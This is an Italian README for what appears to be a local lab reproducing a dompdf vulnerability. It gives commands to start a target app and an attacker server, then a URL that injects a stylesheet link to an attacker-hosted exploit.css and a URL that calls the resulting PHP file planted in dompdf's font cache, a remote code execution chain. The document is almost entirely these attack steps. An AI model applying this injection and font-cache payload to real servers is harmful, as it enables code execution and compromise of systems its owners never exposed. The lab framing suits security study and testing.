# Guida All'Uso
## Setup del progetto
1. Entra all'interno della cartella project e lancia questo comando:

    ``` cd public/ && php -S localhost:8000```
2. In un nuovo terminale entra all'interno della cartella server_exploit e lancia questo comando:

    ```php -S localhost:9000```

## Comandi per eseguire l'attacco
1. Inietta codice malevolo:

    ```http://localhost:8000/pdf/make?data=%3Clink%20rel=stylesheet%20href=%27http://localhost:9000/exploit.css%27%3E```
2. Accedi al file con il codice malevolo:

    ```http://localhost:8000/dompdf/lib/fonts/exploitfont_normal_ab81032048ddcc3ce0513091997f6fe7.php```

